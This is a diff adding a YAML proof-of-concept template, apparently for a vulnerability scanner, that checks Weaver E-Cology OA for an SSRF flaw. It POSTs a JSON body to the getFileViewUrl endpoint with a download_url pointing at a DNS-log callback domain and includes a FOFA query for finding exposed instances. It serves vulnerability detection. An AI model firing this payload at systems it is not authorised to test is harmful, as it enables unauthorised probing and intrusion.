@@ -1,0 +1,28 @@
+id: poc-yaml-weaver-e-cology-getfileviewurl-ssrf
+info:
+  name: 泛微OA E-Cology getFileViewUrl SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: e-cology
+  fofa: app="泛微-OA（e-cology）"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /api/doc/mobile/fileview/getFileViewUrl
+  headers:
+    Content-Type: application/json
+  data: '{
+
+    "file_id": "1000",
+
+    "file_name": "c",
+
+    "download_url":"http://{{.domain}}"
+
+    }'
+  expression: reverse.Verify()
+transport: http
